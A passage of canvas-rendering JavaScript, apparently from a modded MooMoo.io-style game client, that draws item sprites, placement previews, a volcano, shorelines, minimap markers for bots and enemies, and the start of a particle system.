      obj.scale * Math.sin(leafDir),
      25,
      leafDir + Math.PI / 2,
      tmpContext,
    );
  } else if (obj.name == "cookie") {
    tmpContext.fillStyle = "#cca861";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fillStyle = "#937c4b";
    let chips = 4;
    let rotVal = (Math.PI * 2) / chips;
    let tmpRange;
    for (let i = 0; i < chips; ++i) {
      tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
      renderCircle(
        tmpRange * Math.cos(rotVal * i),
        tmpRange * Math.sin(rotVal * i),
        UTILS.randInt(4, 5),
        tmpContext,
        true,
      );
    }
  } else if (obj.name == "cheese") {
    tmpContext.fillStyle = "#f4f3ac";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fillStyle = "#c3c28b";
    let chips = 4;
    let rotVal = (Math.PI * 2) / chips;
    let tmpRange;
    for (let i = 0; i < chips; ++i) {
      tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
      renderCircle(
        tmpRange * Math.cos(rotVal * i),
        tmpRange * Math.sin(rotVal * i),
        UTILS.randInt(4, 5),
        tmpContext,
        true,
      );
    }
  } else if (
    obj.name == "wood wall" ||
    obj.name == "stone wall" ||
    obj.name == "castle wall"
  ) {
    tmpContext.fillStyle =
      obj.name == "castle wall"
        ? "#83898e"
        : obj.name == "wood wall"
          ? "#a5974c"
          : "#939393";
    let sides = obj.name == "castle wall" ? 4 : 3;
    renderStar(tmpContext, sides, obj.scale * 1.1, obj.scale * 1.1);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle =
      obj.name == "castle wall"
        ? "#9da4aa"
        : obj.name == "wood wall"
          ? "#c9b758"
          : "#bcbcbc";
    renderStar(tmpContext, sides, obj.scale * 0.65, obj.scale * 0.65);
    tmpContext.fill();
  } else if (
    obj.name == "spikes" ||
    obj.name == "greater spikes" ||
    obj.name == "poison spikes" ||
    obj.name == "spinning spikes"
  ) {
    tmpContext.fillStyle = obj.name == "poison spikes" ? "#7b935d" : "#939393";
    let tmpScale = obj.scale * 0.6;
    renderStar(tmpContext, obj.name == "spikes" ? 5 : 6, obj.scale, tmpScale);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "#a5974c";
    renderCircle(0, 0, tmpScale, tmpContext);
    tmpContext.fillStyle = "#c9b758";
    renderCircle(0, 0, tmpScale / 2, tmpContext, true);
  } else if (
    obj.name == "windmill" ||
    obj.name == "faster windmill" ||
    obj.name == "power mill"
  ) {
    tmpContext.fillStyle = "#a5974c";
    renderCircle(0, 0, reScale, tmpContext);
    tmpContext.fillStyle = "#c9b758";
    renderRectCircle(0, 0, reScale * 1.5, 29, 4, tmpContext);
    tmpContext.fillStyle = "#a5974c";
    renderCircle(0, 0, reScale * 0.5, tmpContext);
  } else if (obj.name == "mine") {
    tmpContext.fillStyle = "#939393";
    renderStar(tmpContext, 3, obj.scale, obj.scale);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "#bcbcbc";
    renderStar(tmpContext, 3, obj.scale * 0.55, obj.scale * 0.65);
    tmpContext.fill();
  } else if (obj.name == "sapling") {
    for (let i = 0; i < 2; ++i) {
      let tmpScale = obj.scale * (!i ? 1 : 0.5);
      renderStar(tmpContext, 7, tmpScale, tmpScale * 0.7);
      tmpContext.fillStyle = !i ? "#9ebf57" : "#b4db62";
      tmpContext.fill();
      if (!i) tmpContext.stroke();
    }
  } else if (obj.name == "pit trap") {
    tmpContext.fillStyle = "#a5974c";
    renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = outlineColor;
    renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
    tmpContext.fill();
  } else if (obj.name == "boost pad") {
    tmpContext.fillStyle = "#7e7f82";
    renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "#dbd97d";
    renderTriangle(obj.scale * 1, tmpContext);
  } else if (obj.name == "turret") {
    tmpContext.fillStyle = "#a5974c";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "#939393";
    let tmpLen = 50;
    renderRect(0, -tmpLen / 2, obj.scale * 0.9, tmpLen, tmpContext);
    renderCircle(0, 0, obj.scale * 0.6, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
  } else if (obj.name == "platform") {
    tmpContext.fillStyle = "#cebd5f";
    let tmpCount = 4;
    let tmpS = obj.scale * 2;
    let tmpW = tmpS / tmpCount;
    let tmpX = -(obj.scale / 2);
    for (let i = 0; i < tmpCount; ++i) {
      renderRect(tmpX - tmpW / 2, 0, tmpW, obj.scale * 2, tmpContext);
      tmpContext.fill();
      tmpContext.stroke();
      tmpX += tmpS / tmpCount;
    }
  } else if (obj.name == "healing pad") {
    tmpContext.fillStyle = "#7e7f82";
    renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "#db6e6e";
    renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
  } else if (obj.name == "spawn pad") {
    tmpContext.fillStyle = "#7e7f82";
    renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "#71aad6";
    renderCircle(0, 0, obj.scale * 0.6, tmpContext);
  } else if (obj.name == "blocker") {
    tmpContext.fillStyle = "#7e7f82";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.rotate(Math.PI / 4);
    tmpContext.fillStyle = "#db6e6e";
    renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
  } else if (obj.name == "teleporter") {
    tmpContext.fillStyle = "#7e7f82";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.rotate(Math.PI / 4);
    tmpContext.fillStyle = "#d76edb";
    renderCircle(0, 0, obj.scale * 0.5, tmpContext, true);
  }
  tmpContext.restore();
}

let objSprites = [];

function getObjSprite(obj) {
  let tmpSprite = objSprites[obj.id];
  if (tmpSprite) return tmpSprite;

  let c = document.createElement("canvas");
  c.width = c.height =
    obj.scale * 2.5 + outlineWidth + (items.list[obj.id].spritePadding || 0);
  let ctx = c.getContext("2d");

  ctx.translate(c.width / 2, c.height / 2);
  ctx.rotate(Math.PI / 2);
  ctx.strokeStyle = outlineColor;
  ctx.lineWidth = outlineWidth;

  if (
    obj.name == "spikes" ||
    obj.name == "greater spikes" ||
    obj.name == "poison spikes" ||
    obj.name == "spinning spikes"
  ) {
    let baseCol = obj.name == "poison spikes" ? "#7b935d" : "#939393";
    let darkCol = obj.name == "poison spikes" ? "#5f7448" : "#7a7a7a";

    let inner = obj.scale * 0.6;
    let points = obj.name == "spikes" ? 5 : 6;

    ctx.save();
    ctx.translate(0, 2);
    ctx.fillStyle = darkCol;
    renderStar(ctx, points, obj.scale, inner);
    ctx.fill();
    ctx.restore();

    ctx.fillStyle = baseCol;
    renderStar(ctx, points, obj.scale, inner);
    ctx.fill();
    ctx.stroke();

    ctx.globalAlpha = 0.5;
    ctx.fillStyle = darkCol;
    renderStar(ctx, points, obj.scale * 0.85, inner * 0.85);
    ctx.fill();
    ctx.globalAlpha = 1;

    ctx.fillStyle = "#e6e6e6";
    renderCircle(0, 0, inner, ctx);
    ctx.fill();

    ctx.fillStyle = obj.name == "poison spikes" ? "#b8c97a" : "#ffb6c1";
    renderCircle(0, 0, inner * 0.45, ctx, true);
  } else if (obj.name == "pit trap") {
    ctx.save();
    ctx.translate(0, 3);
    ctx.fillStyle = "#d6d6d6";
    renderStar(ctx, 3, obj.scale * 1.1, obj.scale * 1.1);
    ctx.fill();
    ctx.restore();

    ctx.fillStyle = "#ffffff";
    renderStar(ctx, 3, obj.scale * 1.1, obj.scale * 1.1);
    ctx.fill();
    ctx.stroke();

    ctx.globalAlpha = 0.6;
    ctx.fillStyle = "#ff9bb8";
    renderStar(ctx, 3, obj.scale * 0.7, obj.scale * 0.7);
    ctx.fill();
    ctx.globalAlpha = 1;
  }

  objSprites[obj.id] = c;
  return c;
}

function getMarkSprite(obj, tmpContext, tmpX, tmpY) {
  let center = { x: screenWidth / 2, y: screenHeight / 2 };

  let time = (Date.now() % 2000) / 2000;
  let pulseAlpha = 0.3 + Math.sin(time * Math.PI * 2) * 0.1;
  let scalePulse = 1 + Math.sin(time * Math.PI * 2) * 0.05;

  mainContext.globalAlpha = pulseAlpha;
  tmpContext.lineWidth = 1.5;
  tmpContext.strokeStyle = "rgba(255, 255, 255, 0.7)";

  tmpContext.save();
  tmpContext.translate(tmpX, tmpY);
  tmpContext.rotate(obj.dir || getAttackDir());
  tmpContext.scale(scalePulse, scalePulse);

  if (
    obj.name == "spikes" ||
    obj.name == "greater spikes" ||
    obj.name == "poison spikes" ||
    obj.name == "spinning spikes"
  ) {
    let spikeCount = obj.name == "spikes" ? 5 : 6;
    let color =
      obj.name == "poison spikes"
        ? "rgba(0, 255, 0, 0.7)"
        : "rgba(0, 255, 0, 0.7)";
    tmpContext.fillStyle = color;
    let innerScale = obj.scale * 0.6;
    renderStar(tmpContext, spikeCount, obj.scale, innerScale);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "rgba(165, 151, 76, 0.6)";
    renderCircle(0, 0, innerScale, tmpContext);
    if (
      player &&
      obj.owner &&
      player.sid != obj.owner.sid &&
      !tmpObj.findAllianceBySid(obj.owner.sid)
    ) {
      tmpContext.fillStyle = "rgba(163, 64, 64, 0.6)";
    } else {
      tmpContext.fillStyle = "rgba(201, 183, 88, 0.6)";
    }
    renderCircle(0, 0, innerScale / 2, tmpContext, true);
  } else if (obj.name == "turret") {
    tmpContext.fillStyle = "rgba(165, 151, 76, 0.6)";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "rgba(147, 147, 147, 0.7)";
    let tmpLen = 50;
    renderRect(0, -tmpLen / 2, obj.scale * 0.9, tmpLen, tmpContext);
    renderCircle(0, 0, obj.scale * 0.6, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
  } else if (obj.name == "teleporter") {
    tmpContext.fillStyle = "rgba(126, 127, 130, 0.6)";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.rotate(Math.PI / 4);
    tmpContext.fillStyle = "rgba(215, 110, 219, 0.7)";
    renderCircle(0, 0, obj.scale * 0.5, tmpContext, true);
  } else if (obj.name == "platform") {
    tmpContext.fillStyle = "rgba(206, 189, 95, 0.6)";
    let tmpCount = 4;
    let tmpS = obj.scale * 2;
    let tmpW = tmpS / tmpCount;
    let tmpXpos = -(obj.scale / 2);
    for (let i = 0; i < tmpCount; ++i) {
      renderRect(tmpXpos - tmpW / 2, 0, tmpW, obj.scale * 2, tmpContext);
      tmpContext.fill();
      tmpContext.stroke();
      tmpXpos += tmpS / tmpCount;
    }
  } else if (obj.name == "healing pad") {
    tmpContext.fillStyle = "rgba(126, 127, 130, 0.6)";
    renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "rgba(219, 110, 110, 0.7)";
    renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
  } else if (obj.name == "spawn pad") {
    tmpContext.fillStyle = "rgba(126, 127, 130, 0.6)";
    renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.fillStyle = "rgba(113, 170, 214, 0.7)";
    renderCircle(0, 0, obj.scale * 0.6, tmpContext);
  } else if (obj.name == "blocker") {
    tmpContext.fillStyle = "rgba(126, 127, 130, 0.6)";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fill();
    tmpContext.stroke();
    tmpContext.rotate(Math.PI / 4);
    tmpContext.fillStyle = "rgba(219, 110, 110, 0.7)";
    renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
  } else if (
    obj.name == "windmill" ||
    obj.name == "faster windmill" ||
    obj.name == "power mill"
  ) {
    tmpContext.fillStyle = "rgba(165, 151, 76, 0.6)";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fillStyle = "rgba(201, 183, 88, 0.7)";
    renderRectCircle(0, 0, obj.scale * 1.5, 29, 4, tmpContext);
    tmpContext.fillStyle = "rgba(165, 151, 76, 0.6)";
    renderCircle(0, 0, obj.scale * 0.5, tmpContext);
  } else if (obj.name == "pit trap") {
    tmpContext.fillStyle = "rgba(165, 151, 76, 0.6)";
    renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
    tmpContext.fill();
    tmpContext.stroke();
    if (
      player &&
      obj.owner &&
      player.sid != obj.owner.sid &&
      !tmpObj.findAllianceBySid(obj.owner.sid)
    ) {
      tmpContext.fillStyle = "rgba(163, 64, 64, 0.6)";
    } else {
      tmpContext.fillStyle = "rgba(255, 255, 255, 0.6)";
    }
    renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
    tmpContext.fill();
  }

  tmpContext.restore();
}

const baseRenderDistance = 2000;

function isOnScreen(x, y, s) {
  const renderDistance = 1500;
  const centerX = maxScreenWidth / 2;
  const centerY = maxScreenHeight / 2;

  const distanceSquared = (x - centerX) ** 2 + (y - centerY) ** 2;

  if (distanceSquared > renderDistance ** 2) {
    tmpObj.fadeAlpha = 0;
    return false;
  }

  const fadeDistance = 150;
  const distance = Math.sqrt(distanceSquared);
  const fadeStart = renderDistance - fadeDistance;

  const fadeSpeed = 1 / 120;

  if (tmpObj.fadeAlpha === undefined) tmpObj.fadeAlpha = 0;

  if (distance > fadeStart) {
    const fadeProgress = (distance - fadeStart) / fadeDistance;
    const targetAlpha = Math.max(0, 1 - fadeProgress);

    tmpObj.fadeAlpha = Math.max(targetAlpha, tmpObj.fadeAlpha - fadeSpeed);
  } else {
    tmpObj.fadeAlpha = Math.min(1, tmpObj.fadeAlpha + fadeSpeed);
  }

  return true;
}

function renderBrokenObjects(xOffset, yOffset) {
  const fadeSpeed = 1 / 120;

  for (let i = breakObjects.length - 1; i >= 0; i--) {
    const obj = breakObjects[i];

    if (obj.fadeAlpha === undefined) obj.fadeAlpha = 1;

    obj.fadeAlpha = Math.max(0, obj.fadeAlpha - fadeSpeed);

    if (obj.fadeAlpha <= 0) {
      breakObjects.splice(i, 1);
      continue;
    }

    const screenX = obj.x - xOffset;
    const screenY = obj.y - yOffset;

    const centerX = maxScreenWidth / 2;
    const centerY = maxScreenHeight / 2;
    const distanceSquared = (screenX - centerX) ** 2 + (screenY - centerY) ** 2;

    if (distanceSquared > 1500 ** 2) continue;

    mainContext.save();
    mainContext.globalAlpha = obj.fadeAlpha;
    mainContext.fillStyle = "rgba(100, 100, 100, 0.5)";
    mainContext.fillRect(screenX - 20, screenY - 20, 40, 40);
    mainContext.restore();
  }
}
function createVolcano() {
  let volcanoDimension = config.volcanoScale * 2;
  let landCanvas = document.createElement("canvas");
  landCanvas.width = volcanoDimension;
  landCanvas.height = volcanoDimension;
  let landContext = landCanvas.getContext("2d");
  landContext.strokeStyle = "#3e3e3e";
  landContext.lineWidth = 11;
  landContext.fillStyle = "#7f7f7f";
  renderPolygon(landContext, 10, volcanoDimension);
  landContext.fill();
  landContext.stroke();
  volcano.land = landCanvas;
  let lavaCanvas = document.createElement("canvas");
  let lavaDimension = config.innerVolcanoScale * 2;
  lavaCanvas.width = lavaDimension;
  lavaCanvas.height = lavaDimension;
  let lavaContext = lavaCanvas.getContext("2d");
  lavaContext.strokeStyle = "#525252";
  lavaContext.lineWidth = 8.8;
  lavaContext.fillStyle = "#f54e16";
  lavaContext.strokeStyle = "#f56f16";
  renderPolygon(lavaContext, 10, lavaDimension);
  lavaContext.fill();
  lavaContext.stroke();
  volcano.lava = lavaCanvas;
}
createVolcano();
function renderGameObjects(layer, xOffset, yOffset) {
  let tmpSprite;
  let tmpX;
  let tmpY;
  liztobj.forEach((tmp) => {
    tmpObj = tmp;
    if (tmpObj.active && liztobj.includes(tmp) && tmpObj.render) {
      tmpX = tmpObj.x + tmpObj.xWiggle - xOffset;
      tmpY = tmpObj.y + tmpObj.yWiggle - yOffset;
      if (layer == 0) {
        tmpObj.update(delta);
      }

      let inRange = isOnScreen(tmpX, tmpY, tmpObj.scale);

      if (!inRange && bottics.length > 0) {
        for (let bot of bottics) {
          if (bot && bot.Bot && bot.Bot.alive) {
            const botDist = UTILS.getDist(tmpObj, bot.Bot, 0, 2);
            const botRenderDist = 2500;
            if (botDist < botRenderDist) {
              inRange = true;
              break;
            }
          }
        }
      }

      if (!inRange) return;

      const fadeAlpha = tmpObj.fadeAlpha !== undefined ? tmpObj.fadeAlpha : 0;
      mainContext.globalAlpha = tmpObj.alpha * fadeAlpha;

      if (fadeAlpha <= 0) return;

      if (tmpObj.layer == layer) {
        if (tmpObj.isItem) {
          tmpSprite = getItemSprite(tmpObj);

          // Override alpha for traps with enemies
          if (tmpObj.trap && tmpObj._enemyTrapped && tmpObj._trappedFade > 0) {
            mainContext.globalAlpha = Math.min(
              1,
              tmpObj.alpha + tmpObj._trappedFade * (1 - tmpObj.alpha),
            );
          }

          mainContext.save();
          mainContext.translate(tmpX, tmpY);

          const spinAngle = tmpObj._wig?.spin || 0;
          mainContext.rotate(tmpObj.dir + spinAngle);
          if (!tmpObj.active) {
            mainContext.scale(
              tmpObj.visScale / tmpObj.scale,
              tmpObj.visScale / tmpObj.scale,
            );
          }
          mainContext.drawImage(
            tmpSprite,
            -(tmpSprite.width / 2),
            -(tmpSprite.height / 2),
          );

          if (tmpObj.blocker) {
            mainContext.strokeStyle = "#db6e6e";
            mainContext.globalAlpha = 0.3;
            mainContext.lineWidth = 6;
            renderCircle(0, 0, tmpObj.blocker, mainContext, false, true);
          }
          mainContext.restore();
        } else if (tmpObj.type == 4) {
          let XOffset = volcano.xof;
          let YOffset = volcano.yof;
          volcano.animationTime += delta;
          volcano.animationTime %= config.volcanoAnimationDuration;
          let halfAnimationDuration = config.volcanoAnimationDuration / 2;
          let lavaScaleFactor =
            1.7 +
            (Math.abs(halfAnimationDuration - volcano.animationTime) /
              halfAnimationDuration) *
            0.3;
          let finalLavaScale = config.innerVolcanoScale * lavaScaleFactor;
          mainContext.drawImage(
            volcano.land,
            volcano.x - config.volcanoScale - XOffset,
            volcano.y - config.volcanoScale - YOffset,
            config.volcanoScale * 2,
            config.volcanoScale * 2,
          );
          mainContext.drawImage(
            volcano.lava,
            volcano.x - finalLavaScale - XOffset,
            volcano.y - finalLavaScale - YOffset,
            finalLavaScale * 2,
            finalLavaScale * 2,
          );
        } else {
          tmpSprite = getResSprite(tmpObj);
          mainContext.drawImage(
            tmpSprite,
            tmpX - tmpSprite.width / 2,
            tmpY - tmpSprite.height / 2,
          );
        }
      }
      if (layer == 3) {
      }
      mainContext.restore();
    }
  });

  if (layer == 0) {
    if (placeVisible.length) {
      placeVisible.forEach((places) => {
        tmpX = places.x - xOffset;
        tmpY = places.y - yOffset;
        markObject(places, tmpX, tmpY);
      });
    }
  }
}

function markObject(tmpObj, tmpX, tmpY) {
  getMarkSprite(tmpObj, mainContext, tmpX, tmpY);
}

class MapPing {
  constructor(color, scale) {
    this.init = function (x, y) {
      this.scale = 0;
      this.x = x;
      this.y = y;
      this.active = true;
    };
    this.update = function (ctxt, delta) {
      if (this.active) {
        this.scale += 0.05 * delta;
        if (this.scale >= scale) {
          this.active = false;
        } else {
          ctxt.globalAlpha = 1 - Math.max(0, this.scale / scale);
          ctxt.beginPath();
          ctxt.arc(
            (this.x / config.mapScale) * mapDisplay.width,
            (this.y / config.mapScale) * mapDisplay.width,
            this.scale,
            0,
            2 * Math.PI,
          );
          ctxt.stroke();
        }
      }
    };
    this.color = color;
  }
}

function pingMap(x, y) {
  tmpPing = mapPings.find((pings) => !pings.active);
  if (!tmpPing) {
    tmpPing = new MapPing("#FFB6C1", config.mapPingScale);
    mapPings.push(tmpPing);
  }
  tmpPing.init(x, y);
}

function updateMapMarker() {
  mapMarker.x = player.x;
  mapMarker.y = player.y;
}

function renderMinimap(delta) {
  if (player && player.alive) {
    mapContext.clearRect(0, 0, mapDisplay.width, mapDisplay.height);

    mapContext.lineWidth = 4;
    for (let i = 0; i < mapPings.length; ++i) {
      tmpPing = mapPings[i];
      mapContext.strokeStyle = tmpPing.color;
      tmpPing.update(mapContext, delta);
    }

    mapContext.globalAlpha = 1;
    mapContext.fillStyle = "#55AA55";
    renderCircle(
      (player.x / config.mapScale) * mapDisplay.width,
      (player.y / config.mapScale) * mapDisplay.height,
      7,
      mapContext,
      true,
    );
    mapContext.fillStyle = "rgba(255, 182, 193, 0.35)";
    if (player.team && minimapData) {
      for (let i = 0; i < minimapData.length;) {
        renderCircle(
          (minimapData[i] / config.mapScale) * mapDisplay.width,
          (minimapData[i + 1] / config.mapScale) * mapDisplay.height,
          7,
          mapContext,
          true,
        );
        i += 2;
      }
    }

    if (lastDeath) {
      mapContext.fillStyle = "#fc5553";
      mapContext.font = "34px 'Comic Sans MS', cursive";
      mapContext.textBaseline = "middle";
      mapContext.textAlign = "center";
      mapContext.fillText("x", (lastDeath.x / config.mapScale) * mapDisplay.width,
        (lastDeath.y / config.mapScale) * mapDisplay.height);
    }

    if (mapMarker) {
      mapContext.fillStyle = "#fff";
      mapContext.font = "34px HammerSmith One";
      mapContext.textBaseline = "middle";
      mapContext.textAlign = "center";
      mapContext.fillText(
        "x",
        (mapMarker.x / config.mapScale) * mapDisplay.width,
        (mapMarker.y / config.mapScale) * mapDisplay.height,
      );
    }
    bottics.forEach((c) => {
      if (
        c &&
        c.inGame &&
        c.Bot &&
        c.Bot.alive &&
        typeof c.Bot.x2 === "number" &&
        typeof c.Bot.y2 === "number" &&
        c.Bot.x2 > 0 &&
        c.Bot.y2 > 0
      ) {
        const mapX = (c.Bot.x2 / config.mapScale) * mapDisplay.width;
        const mapY = (c.Bot.y2 / config.mapScale) * mapDisplay.height;
        mapContext.fillStyle = "white";
        mapContext.globalAlpha = 0.4;
        mapContext.beginPath();
        mapContext.arc(mapX, mapY, 7, 0, Math.PI * 2);
        mapContext.fill();
      }
    });
    BreakTracker(null, "M");

    const now = Date.now();
    for (let i = playerEnemyMarkers.length - 1; i >= 0; i--) {
      const marker = playerEnemyMarkers[i];
      const age = now - marker.time;
      if (age < 30000) {
        const alpha = Math.max(0, 1 - age / 30000);
        const mapX = (marker.x / config.mapScale) * mapDisplay.width;
        const mapY = (marker.y / config.mapScale) * mapDisplay.height;

        const pulseScale = 1 + Math.sin(now / 300) * 0.2;
        mapContext.globalAlpha = alpha * 0.8;
        mapContext.fillStyle = "#ff0000";
        mapContext.beginPath();
        mapContext.arc(mapX, mapY, 6 * pulseScale, 0, Math.PI * 2);
        mapContext.fill();

        mapContext.globalAlpha = alpha * 0.4;
        mapContext.strokeStyle = "#ff0000";
        mapContext.lineWidth = 2;
        mapContext.beginPath();
        mapContext.arc(mapX, mapY, 9 * pulseScale, 0, Math.PI * 2);
        mapContext.stroke();
        mapContext.globalAlpha = 1;
      } else {
        playerEnemyMarkers.splice(i, 1);
      }
    }
  }
}

let iconSprites = {};
let icons = ["crown", "skull"];

function loadIcons() {
  for (let i = 0; i < icons.length; ++i) {
    let tmpSprite = new Image();
    tmpSprite.onload = function () {
      this.isLoaded = true;
    };
    tmpSprite.src = "./../img/icons/" + icons[i] + ".png";
    iconSprites[icons[i]] = tmpSprite;
  }
}
loadIcons();

function cdf(e, t) {
  try {
    return Math.hypot(
      (t.y2 || t.y) - (e.y2 || e.y),
      (t.x2 || t.x) - (e.x2 || e.x),
    );
  } catch (e) {
    return Infinity;
  }
}

function seePoint(point) {
  let deltaX = Math.abs(point.x - player.x) - point.scale;
  let deltaY = Math.abs(point.y - player.y) - point.scale;
  let maxVisibleWidth = (maxScreenWidth / 2) * 1.3;
  let maxVisibleHeight = (maxScreenHeight / 2) * 1.3;
  return deltaX <= maxVisibleWidth && deltaY <= maxVisibleHeight;
}

function ShorePath(startX, startY, endX, distance, float) {
  this.startX = startX;
  this.startY = startY;
  this.endX = endX;
  this.distance = distance;
  this.float = float;

  this.amountPaths = Math.ceil(this.endX / this.distance);

  this.path = new Map();

  this.generate = function () {
    for (let i = 1; i <= this.amountPaths; i += 1) {
      const offsetY = i % 2 === 0 ? this.distance : 0;
      const x = this.startX + this.distance * (i - 1);
      const randomOffsetY = Math.floor(Math.random() * (45 - 10)) + 10;
      const y =
        this.startY +
        ((this.float === "down" ? offsetY : -offsetY) +
          (i % 2 === 0
            ? Math.random() < 0.55
              ? randomOffsetY
              : -randomOffsetY
            : 0));

      this.path.set(i, [x, y, offsetY, randomOffsetY]);
    }
  };

  this.render = function (color, xOffset, yOffset) {
    const path = Array.from(this.path.values());
    if (!player?.active || !player?.alive) return;

    for (let i = 1; i < path.length; i++) {
      const oldPoint = path[i - 1];
      const currentPoint = path[i];

      if (
        !seePoint({
          x: oldPoint[0],
          y: oldPoint[1],
          scale: 10,
        })
      )
        continue;

      if (
        !seePoint({
          x: currentPoint[0],
          y: currentPoint[1],
          scale: 10,
        })
      )
        continue;

      const pointOffset = this.distance / 2;
      const sidePoint1 = [
        oldPoint[0] - pointOffset / 2,
        oldPoint[1] + (oldPoint[2] === 0 ? pointOffset : -pointOffset),
      ];
      const sidePoint2 = [
        currentPoint[0] + pointOffset * 1.15,
        currentPoint[1] + pointOffset * 1.2,
      ];
      const sidePoint3 = [
        currentPoint[0] + pointOffset * 1.35,
        currentPoint[1] - pointOffset * 1.15,
      ];
      const sidePoint4 = [
        currentPoint[0] - pointOffset * 1.35,
        currentPoint[1] + pointOffset * 1.15,
      ];

      mainContext.save();
      mainContext.fillStyle = color;
      mainContext.lineCap = "round";
      mainContext.lineJoin = "round";
      mainContext.beginPath();
      mainContext.moveTo(oldPoint[0] - xOffset, oldPoint[1] - yOffset);
      mainContext.lineTo(
        oldPoint[0] + this.distance * 2 - xOffset,
        this.startY - yOffset,
      );
      mainContext.lineTo(currentPoint[0] - xOffset, currentPoint[1] - yOffset);
      mainContext.fill();
      mainContext.beginPath();
      mainContext.moveTo(oldPoint[0] - xOffset, oldPoint[1] - yOffset);
      mainContext.bezierCurveTo(
        sidePoint1[0] - xOffset,
        sidePoint1[1] - yOffset,
        sidePoint2[0] - xOffset,
        sidePoint2[1] - yOffset,
        currentPoint[0] + (currentPoint[3] >= 10 ? 3.5 : 1) - xOffset,
        currentPoint[1] - yOffset,
      );
      mainContext.fill();
      mainContext.beginPath();
      mainContext.moveTo(currentPoint[0] - xOffset, currentPoint[1] - yOffset);
      mainContext.bezierCurveTo(
        sidePoint2[0] - xOffset,
        sidePoint2[1] - yOffset,
        sidePoint3[0] - xOffset,
        sidePoint3[1] - yOffset,
        currentPoint[0] + this.distance * 2 - xOffset,
        this.startY - yOffset,
      );
      mainContext.fill();
      mainContext.restore();
    }
  };

  return this.generate();
}

const snowPath = new ShorePath(
  -maxScreenWidth,
  config.snowBiomeTop - 1,
  config.mapScale + maxScreenWidth * 2,
  20,
  "down",
);
const desertPath = new ShorePath(
  -maxScreenWidth,
  config.mapScale - config.snowBiomeTop + 1,
  config.mapScale + maxScreenWidth * 2,
  50,
  "up",
);

let nightModeState = {
  // Ueh logic of making beutiful stars
  get isEnabled() {
    return AB.Menu.nightMode !== false;
  },
  overlay: { opacity: 0, r: 0, g: 0, b: 0 },
  starField: [],
};

let starSpawnTimer = 0;

// Abyss Particle System
const AbyssParticles = {
  // Create particle based on type
  createParticle(type, offsetX, offsetY) {
    const baseSize = (AB.Menu.particleSize || 1) * UTILS.randFloat(2, 6);
    const speed = AB.Menu.particleSpeed || 1;

    const base = {
      posX: offsetX + UTILS.randFloat(0, maxScreenWidth),
      posY: offsetY + UTILS.randFloat(0, maxScreenHeight),
      size: baseSize,
      transparency: 0,
      visible: true,
      brightening: true,
      type: type,
      age: 0,
      maxAge: UTILS.randFloat(3000, 8000),
    };

    switch (type) {
      case "stars":
        const scaleMultiplier = UTILS.randFloat(1, 3);
        return {
          ...base,
          scaleMultiplier: scaleMultiplier,
          posX: offsetX * scaleMultiplier + UTILS.randFloat(0, maxScreenWidth),
          posY: offsetY * scaleMultiplier + UTILS.randFloat(0, maxScreenHeight),
          color: `rgb(255, 255, ${UTILS.randInt(0, 255)})`,
          twinkleSpeed: UTILS.randFloat(0.01, 0.03),
        };

      case "voidParticles":
        return {
          ...base,
          scaleMultiplier: UTILS.randFloat(0.5, 2),
          velocityY: -UTILS.randFloat(0.3, 1) * speed,
          velocityX: UTILS.randFloat(-0.2, 0.2) * speed,
          color: "rgb(155, 92, 255)",
          glowSize: baseSize * 2,
          pulse: 0,
          pulseSpeed: UTILS.randFloat(0.02, 0.05),
        };

      case "wisps":
        return {
          ...base,
          scaleMultiplier: 1,
          angle: UTILS.randFloat(0, Math.PI * 2),
          angleSpeed: UTILS.randFloat(-0.02, 0.02) * speed,
          waveAmplitude: UTILS.randFloat(20, 50),
          waveFrequency: UTILS.randFloat(0.001, 0.003),
          waveOffset: UTILS.randFloat(0, Math.PI * 2),
          velocityY: UTILS.randFloat(-0.3, 0.3) * speed,
          color: { r: 0, g: 255, b: 255 },
          trail: [],
          maxTrail: 8,
        };

      case "embers":
        return {
          ...base,
          scaleMultiplier: UTILS.randFloat(0.5, 1.5),
          velocityY: UTILS.randFloat(0.5, 1.5) * speed,
